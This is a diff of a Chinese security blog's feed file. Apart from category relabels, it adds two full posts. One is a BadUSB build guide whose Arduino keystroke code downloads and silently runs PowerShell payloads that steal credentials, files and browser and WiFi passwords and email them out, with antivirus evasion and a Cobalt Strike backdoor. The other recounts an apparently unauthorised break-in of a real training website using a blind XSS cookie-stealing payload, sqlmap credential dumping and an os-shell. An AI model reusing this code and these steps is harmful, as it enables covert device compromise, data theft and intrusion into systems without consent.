@@ -51,7 +51,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 漏洞挖掘 </category>
           
       </categories>
       
@@ -76,7 +76,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全开发 </category>
           
       </categories>
       
@@ -101,7 +101,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 代码审计 </category>
           
       </categories>
       
@@ -126,7 +126,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -174,6 +174,18 @@
         <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01-简介"></a>0x01-简介</h2><p>1.概述<br>在2014年美国黑帽大会上，安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。<br><a href="https://imgchr.com/i/eACtFU"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450785.png" alt="eACtFU.png"></a></p><p>2.Badusb内部结构<br><a href="https://imgchr.com/i/eAC0yR"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450609.png" alt="eAC0yR.png"></a><br>从这张图便可以了解到–Badusb和普通的U盘并没有什么两样，因此迷惑性极高，很容易攻击成功</p><p>3.Badusb Hid攻击原理<br>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。简而言之，今天要介绍的Badusb利用的是虚拟键盘来实现恶意代码的执行。</p><p>4.Badusb攻击优势<br>攻击者将恶意代码存放于Badusb的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件无法应对BadUSB的攻击。</p><p>5.Teensy<br>攻击者在定制攻击设备时，会向USB设备中置入一个攻击芯片，此攻击芯片是一个非常小而且功能完整的单片机开发系统，它的名字叫TEENSY。通过TEENSY你可以模拟出一个键盘和鼠标，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器与存储空间和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。<br><a href="https://imgchr.com/i/eACUW4"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450242.png" alt="eACUW4.png"></a></p><p>6.Arduino<br>Arduino是一款便捷灵活、方便上手的开源电子原型平台。其开发环境，主要包含两个主要的部分：硬件部分是可以用来做电路连接的Arduino电路板；另外一个则是Arduino IDE，你的计算机中的程序开发环境。你只要在IDE中编写程序代码，将程序上传到Arduino电路板后，程序便会告诉Arduino电路板要做些什么了。<br><a href="https://imgchr.com/i/eACdSJ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450221.png" alt="eACdSJ.png"></a></p><p>7.攻击流程<br>Bad-Usb插入后，会模拟键盘对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载恶意代码(通常为powershell脚本)并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</p><h2 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02-准备工作"></a>0x02-准备工作</h2><p>1.硬件<br>我在这边选择的是BS Micro pro micro leonardo Arduino 开发板，结构是一个USB主控加一块到两块的存储颗粒。从原理来看。USB主控就是一个带原生usb接口的单片机。<br>虽然它的体积小，但它拥有丰富接口，使其不仅有传统控制器的功能，还有在电脑上实现鼠标、键盘的功能，串口功能，并且无需驱动，能直接实现与电脑的通信。<br>    它与其他大多数的MCU控制板一个很大的区别是编程不需要额外使用编程器，直接用USB就可以编程。这样不仅方便、稳定、可靠，还省下了一个编程器的钱。 </p><p>淘宝链接:<br><a href="https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&id=589099911512&_u=m2i3k6cqf473">https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473</a></p><p>实际到货设备如图<br><a href="https://imgchr.com/i/eACBO1"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451688.png" alt="eACBO1.png"></a></p><p>2.开发环境安装<br>Arduino IDE<br><a href="https://imgchr.com/i/eACyTK"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451614.png" alt="eACyTK.png"></a><br>kali下已集成，windows下载链接：<br><a href="http://downloads.arduino.cc/arduino-1.6.4-windows.zip">http://downloads.arduino.cc/arduino-1.6.4-windows.zip</a><br>下载为zip文件，无需安装，直接解压就能用。<br>注意：不要下载高于1.6.4的版本，否则设备驱动无法正常安装！（我被这个坑乐好一段时间）</p><p>3.驱动准备<br>为了可以正常使用ardunio对开发版进行编程，需安装Teensyduino驱动<br>下载链接<a href="http://www.pjrc.com/teensy/td_123/teensyduino.exe">http://www.pjrc.com/teensy/td_123/teensyduino.exe</a><br><a href="https://imgchr.com/i/eACsw6"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451655.png" alt="eACsw6.png"></a><br>一路Next下来，本处选择刚刚解压的ardunio1.64路径才可以正常安装<br><a href="https://imgchr.com/i/eACWSH"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451046.png" alt="eACWSH.png"></a><br>选择all进行安装<br><a href="https://imgchr.com/i/eACcFO"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451875.png" alt="eACcFO.png"></a></p><p>4.开启smtp服务<br>为确保我们的脚本能够完美地发送包含目标主机信息的邮件，我们需要开启smtp邮箱服务。本处我使用的是QQ邮箱，开启方法如下：<br>进入邮箱，点击设置-账户<br><a href="https://imgchr.com/i/eACgYD"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452562.png" alt="eACgYD.png"></a></p><p>向下拉即可看到<br><a href="https://imgchr.com/i/eAC2fe"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452333.png" alt="eAC2fe.png"></a><br>将头两个服务开启，此过程需要验证密保~<br>即可获得“授权码”（即后文提到的邮箱密码）此处的邮箱密码并不是指QQ密码<br><a href="https://imgchr.com/i/eACfld"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453721.png" alt="eACfld.png"></a></p><p>5.服务器端准备<br>①首先下载Badusb所需代码，代码已打包，见文末<br>②修改压缩包中的main.ps1的2754行，把打码的地方改为自己的服务器IP<br><a href="https://imgchr.com/i/eACQQs"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453507.png" alt="eACQQs.png"></a></p><p>③修改main.ps1的2903-2919行 为发送邮件配置<br><a href="https://imgchr.com/i/eACKzj"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453845.png" alt="eACKzj.png"></a></p><p>④修改GetPass.ps1中的前两行，域名，Getpass.rar实际上是lazagne，用rar下载尽量避免出发安全软件，这个不放心可以百度下载。command.rar实为bat 因为 lazagne注入lsass时会被安全软件拦截，所以用bat避免注入。修改GetPass.ps1中的邮箱配置，同main.ps1中的就行<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453746.png" alt="eAi9KA.png"><br>⑤将修改后的全部文件用HFS（一个简单的提供http下载软件）上传到公网服务器<br>HFS链接：<a href="http://www.ouyaoxiazai.com/soft/stgj/133/21762.html">http://www.ouyaoxiazai.com/soft/stgj/133/21762.html</a><br><a href="https://imgchr.com/i/eACFsI"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453712.png" alt="eACFsI.png"></a></p><h2 id="0x03-Badusb制作"><a href="#0x03-Badusb制作" class="headerlink" title="0x03-Badusb制作"></a>0x03-Badusb制作</h2><p>1.将硬件插入电脑<br><a href="https://imgchr.com/i/eACCzd"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453770.png" alt="eACCzd.png"></a></p><p>2.打开Arduino IDE<br>3.工具-&gt;版-&gt;选择“Arduino Leonardo”<br><a href="https://imgchr.com/i/eACiQA"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453681.png" alt="eACiQA.png"></a></p><p>4.输入Windows +R 输入命令devmgmt.msc打开设备管理器<br>查看串口信息<br><a href="https://imgchr.com/i/eACVdf"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453575.png" alt="eACVdf.png"></a><br>5.根据之前的串口信息，打开ardunio ide选择–工具-&gt;端口-&gt;选择“COM* (Arduino Leonardo)”<br>6.现在可以看到IDE右下角出现“Arduino Leonardo on COM*”<br><a href="https://imgchr.com/i/eACkLt"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453630.png" alt="eACkLt.png"></a><br>6.下面进行将代码写入硬件的操作<br>①复制如下代码到ardunio中</p><pre><code>void setup()&#123;//初始化 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500);Keyboard.press(&#39;r&#39;);//r键delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/main.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//结束键盘通讯 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500);Keyboard.press(&#39;r&#39;);//r键delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/payload.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//结束键盘通讯 &#125;void loop() &#123;&#125;</code></pre><p>请各位将8.8.8.8改成自己的服务器ip~<br>注释写的应该都很明白了，小伙伴们可以根据自己的需求修改</p><p>PS:我这边选择执行两个payload，第一个是我之前教大家修改上传的main.ps1，这个脚本实现的是“截图、用户凭据导出，文件窃取，计算机中浏览器&#x2F;WIFI等密码的读取”并将其通过邮箱发送到我们手中。</p><p>第二个Payload是我在cobaltstrike里面生成的powershell一句话后门<br><a href="https://imgchr.com/i/eACEeP"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454216.png" alt="eACEeP.png"></a></p><p>代码大体的意思是：<br>插入BADusb后等待五秒，<br>切换大写绕开输入法<br>按下Windows+R打开cmd<br>模拟输入一个字符串，并回车执行</p><p>当你将代码写入完成后，恭喜你，Badusb已制作成功<br><a href="https://imgchr.com/i/eACZo8"><img src="https://s2.ax1x.com/2019/07/23/eACZo8.png" alt="eACZo8.png"></a></p><h2 id="0x004测试"><a href="#0x004测试" class="headerlink" title="0x004测试"></a>0x004测试</h2><p>将Badusb插入电脑，短暂几秒延时后，发现打开了cmd窗口，输入了我们下载执行powershell的命令，并回车执行<br><a href="https://imgchr.com/i/eACnJg"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454260.png" alt="eACnJg.png"></a><br>过了几分钟，会来两封邮件<br><a href="https://imgchr.com/i/eACmFS"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454768.png" alt="eACmFS.png"></a><br><a href="https://imgchr.com/i/eAiHzQ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454150.png" alt="eAiHzQ.png"></a><br>这里面便是我们心心念念的Badusb执行结果<br>Report.zip内容如图<br><a href="https://imgchr.com/i/eAiLss"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454104.png" alt="eAiLss.png"></a></p><p>Getpass txt内容如下</p><pre><code>|==========================                                                                       |                                                                |                        The LaZagne Project                       |                                                                   |                                                                   |==========================########## User: Administrator ##########------------------- Chrome passwords -----------------Password found !!!URL: http://127.0.0.1/loginLogin: adminPassword: xunfeng321Password found !!!URL: http://10.97.3.177:8080/cgi-bin/login.htmlLogin: adminPassword: admin..........内容太多，省略了</code></pre><p>Cobaltstrike也收到了会话（我插了好几次）<br><a href="https://imgchr.com/i/eAClyn"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454731.png" alt="eAClyn.png"></a></p><h2 id="0x005攻击场景"><a href="#0x005攻击场景" class="headerlink" title="0x005攻击场景"></a>0x005攻击场景</h2><p>①社工攻击<br>  小姐姐，我的U盘插我的电脑显示不出来，你能帮我看看你的电脑可以吗？<br>  <a href="https://imgchr.com/i/eACGwV"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455578.png" alt="eACGwV.png"></a><br>②带有USB接口的终端机<br><a href="https://imgchr.com/i/eACJoT"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455649.png" alt="eACJoT.png"></a><br>找到USB接口怼进去，插谁谁怀孕<br>其他应用场景自行脑补，欢迎评论分享</p><h2 id="0x06总结"><a href="#0x06总结" class="headerlink" title="0x06总结"></a>0x06总结</h2><p>   今天介绍了硬件设备Badusb的制作及使用，大家可以修改服务器端的powershell代码来实现更多的功能，欢迎评论分享自己的思路<br>本篇文章耗时7小时，也算是自己写过比较长的啦。<br><a href="https://imgchr.com/i/eAC1Lq"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455674.png" alt="eAC1Lq.png"></a></p><h2 id="0x006-Badusb代码下载"><a href="#0x006-Badusb代码下载" class="headerlink" title="0x006 Badusb代码下载"></a>0x006 Badusb代码下载</h2><p>链接：<a href="https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg">https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg</a><br>提取码：zisl</p>]]></content>
       
       
+      <categories>
+          
+          <category> 硬件安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 硬件安全 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -189,7 +201,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -214,7 +226,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -239,7 +251,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -264,7 +276,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -289,7 +301,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -314,7 +326,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -339,7 +351,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -364,7 +376,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -389,7 +401,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -414,7 +426,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -439,7 +451,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -464,7 +476,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -489,7 +501,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -514,7 +526,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 安全工具 </category>
           
       </categories>
       
@@ -562,6 +574,12 @@
         <content type="html"><![CDATA[<h2 id="一、起因"><a href="#一、起因" class="headerlink" title="一、起因"></a>一、起因</h2><p>emmm，炎炎夏日到来，这么个桑拿天干什么好呢？</p><p>没错，一定要坐在家里，吹着空调，吃着西瓜，然后静静地挖洞。挖洞完叫个外卖，喝着啤酒，撸着烧烤，岂不美哉？然此可为智者道，难为俗人言也。。。正在我沉迷在对夏日的意淫之时，我亲爱的妈妈忽然给我来了一波夺命连环call。<br><img src="https://s2.loli.net/2023/04/19/AkbOQ8mXJrWGciF.png" alt="image"></p><pre><code>大概内容如下：   --妈妈：儿呀。。。你印布隐私（认不认识）搞公务员培训的机构，帮我在网上瞅瞅去，我有个朋友他儿想考公务员~   --我：（声音笑嘻嘻，心里mmp）哎呀，这个bia的天，搁家里睡觉行了。。别弄了。。   --妈妈：MLGB，叫你整，你就快点的，晚上给我回电话。     哎，父母之命不可违，悲伤的我只能放下手里的键盘和瓜皮，开始去百度上找培训机构。</code></pre><p><img src="https://s2.loli.net/2023/04/19/8SXb7ntzhoQa1VW.png" alt="image"></p><p>百度上面找了好久，都没找到太合适的。问了问身边的朋友：朋友给了一家网校的报名地址<br><a href="http://xxxxx.com/3g/***/2203947.htm">http://xxxxx.com/3g/***/2203947.htm</a><br><img src="https://s2.loli.net/2023/04/19/XGxvwty2PqhbYFm.png" alt="image"></p><p>没错，还带免费试学。。。真的先进。。。。<br>于是打开爱站查了一波权重。。。<br><img src="https://s2.loli.net/2023/04/19/7h8WRjPqx2pzUti.png" alt="image"></p><p>这尼玛？？？百度权7，emmm，有点意思。见到这么高权重的站，那时我已饥渴难耐，便决定对此站点来一波渗透测试。</p><h2 id="二、XSS盲打？安排一下"><a href="#二、XSS盲打？安排一下" class="headerlink" title="二、XSS盲打？安排一下"></a>二、XSS盲打？安排一下</h2><p><img src="https://s2.loli.net/2023/04/19/TBtgFWdhwo1rHva.png" alt="image"></p><p>看到这里，小伙伴们肯定想。。。emm，是不是可以XSS打一下试试呢？<br>说干咱就干。。。见框就插,接下来就插入xss payload试试吧。。。<br>Payload: <code>&lt;/textarea&gt;&lt;script src=&quot;=&quot;http://xsspt.com/z6ocdy?1531815744&quot;&gt;&lt;/script&gt;</code><br>将payload完整黏贴进去，如图发现仅有&lt;&#x2F;tex    这四个字符<br><img src="https://s2.loli.net/2023/04/19/qlosKBVe4MQ7wnT.png" alt="image"></p><p>审查元素看下，在表单处理上设置了maxlength，直接审查元素大法改掉就好了<br>max length改为999<br><img src="https://s2.loli.net/2023/04/19/INOkbRoaCGU2trM.png" alt="image"><br> 然后我们的XSS Payload就可以正常地全部输入到表单中了<br><img src="https://s2.loli.net/2023/04/19/rEiRl8Oez6Y4Nbf.png" alt="image"></p><p>手机那个文本框，我随便填了11位数字，然后点击提交，万幸的的是提交成功了（后端没对内容进行验证）<br>过了大概1个小时，突然XSS平台的邮件来了，兴奋ing。。。（客服是真的敬业）<br><img src="https://s2.loli.net/2023/04/19/jFwefGsIN4zWPhA.png" alt="image"></p><p>拿着cookie，挂好代理傻啦吧唧地就是进入后台一波浏览，发现权限非常小，基本上只能处理处理客服工作<br><img src="https://s2.loli.net/2023/04/19/CDsozeBltMFfQnK.png" alt="image"></p><p>不过可以查看后台的管理员账号。。。。。（果然是个大站，后台分工权限这么讲究。。。）<br><img src="https://s2.loli.net/2023/04/19/ENcTCxLXKJve3qi.png" alt="image"></p><p>看着这么多的超级管理员账号，而我却只是个吊毛客服，基本上没什么权限，心里真的难受的一批。。<br>难道我们的渗透到这里就要结束？？不可能，这显然不符合本屌的风格。。。<br><img src="https://s2.loli.net/2023/04/19/7caIFXZzemCRuVf.png" alt="image"></p><p>于是我又仔细地翻了翻后台，看看有没有地方可以来一波骚操作。。。</p><h2 id="三、后台SQL注入？讲究"><a href="#三、后台SQL注入？讲究" class="headerlink" title="三、后台SQL注入？讲究"></a>三、后台SQL注入？讲究</h2><p>大家可以看到我们的客服处理界面是可以进行查询的，查询的过程是通过GET方式传导一个mobile参数实现查询</p><p>我们直接FUZZ了一下SQL注入的Payload，看看是否存在注入。</p><p>发现传递特殊字符后，页面没有返回信息，那么就很有可能存在SQL注入。<br><img src="https://s2.loli.net/2023/04/19/5yzX2oJbgBaNnGY.png" alt="image"></p><p>我们使用BurpSuite来抓取本出的的HTTP请求，然后保存在C:\Users\Samsung 700Z5C\Desktop\1.txt中<br><img src="https://s2.loli.net/2023/04/19/7UEgMCSLybF4YIH.png" alt="image"></p><p>接下来到了以小勃大，紧张刺激的时刻，使用SQLMAP的 -r参数，注入本HTTP请求<br><code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt</code><br><img src="https://s2.loli.net/2023/04/19/FQko9HntjrMm5T4.png" alt="image"></p><p>注入成功了。哈哈哈。。。。我们开始直奔管理员的表<br>命令为<code>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt --tables -D &quot;nd_net&quot; </code>     &#x2F;&#x2F;列出nd_net数据库的表<br><img src="https://s2.loli.net/2023/04/19/aD5vJPpdItVkgU4.png" alt="image"></p><p>然后执行<br><code>sqlmap -r C:\Users\Samsung\Desktop\1.txt --columns -T &quot;net_admin_user&quot; -D &quot;nd_net&quot;   //列出net_admin_user</code>表的字段<br><img src="https://s2.loli.net/2023/04/19/syGtfThrBKvXSep.png" alt="image"></p><p>最后执行命令<br><code>sqlmap.py -r &quot;I:\T00l\1.txt&quot; --dump -C &quot;id,nd_user,userid,nd_pass&quot; -T &quot;net_admin_user&quot; -D &quot;nd_net&quot; --threads=10   //导出net_admin_user表中id,nd_user,userid,nd_pass几个字段的数据</code><br><img src="https://s2.loli.net/2023/04/19/oRmSxVl5zUELvXQ.png" alt="image"></p><p>全部是md5加密，拿到cmd5，一波解密，成功获取到所有管理员的账号密码，然后成功登陆以管理员的权限登陆后台<br><img src="https://s2.loli.net/2023/04/19/wuAtjc89YFPogmb.png" alt="image"></p><p>哈哈，讲究！</p><h2 id="四、不拿Shell，与咸鱼有什么区别？"><a href="#四、不拿Shell，与咸鱼有什么区别？" class="headerlink" title="四、不拿Shell，与咸鱼有什么区别？"></a>四、不拿Shell，与咸鱼有什么区别？</h2><p>emm，就算是管理员的权限。我发现可以利用的地方依然很少，只有一些静态页面的编辑权限（而且编辑器是KindEditor，没什么方法上传拿Shell）,我当时十分绝望。。。但是我发现了这个——数据库备份<br><img src="https://s2.loli.net/2023/04/19/NgsyjOKr9BChRux.png" alt="image"></p><p>点击后，跳转到一款叫做“帝国备份王”的程序<br><img src="https://s2.loli.net/2023/04/19/ceJI6Q2SZquURYj.png" alt="image"></p><p>随后，我便去该程序的官网，下载了一个帮助文档。使用默认用户admin&#x2F;123456进行登陆，但是以失败告终。<br>但我怎末可能放弃，我一个一个测试了之前后台SQL注入得到的密码，最终在一个密码上成功地登陆了。。。</p><p>我靠，高兴死我。。。。。。。。<br><img src="https://s2.loli.net/2023/04/19/GIDgkBHJC7LNl3t.png" alt="image"></p><p>发现了一个PHP探针<br><img src="https://s2.loli.net/2023/04/19/fLXW47QSDBhOxyZ.png" alt="image"></p><p>再掏出SQLMAP，直接使用命令 用之前的注入点获取shell</p><p>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt –os-shell<br><img src="https://s2.loli.net/2023/04/19/ORNjiFl4C6t1MTh.png" alt="image"></p><p>输入我们通过探针得到的路径，很幸运，ROOT权限直接os-shell成功。直接上一句话，GetShell完美结束<br><img src="https://s2.loli.net/2023/04/19/NvHrg3s7CSXjh1n.png" alt="image"></p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>本次渗透测试，虽然没有骚操作，但是总体来说用到了许多知识，现进行总结<br>1.XSS盲打技术<br>2.SQLMAP注入HTTP响应包的语法<br>3.人性的弱点分析（多个程序用同一个管理密码）<br>4.从获取绝对路径到SQLMAP获取shell<br>5.审查元素小技巧</p>]]></content>
       
       
+      <categories>
+          
+          <category> 漏洞挖掘 </category>
+          
+      </categories>
+      
       
         <tags>
             
@@ -583,7 +601,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 代码审计,安全开发 </category>
           
       </categories>
       
@@ -608,7 +626,7 @@
       
       <categories>
           
-          <category> blog </category>
+          <category> 漏洞挖掘,硬件安全 </category>
           
       </categories>
       
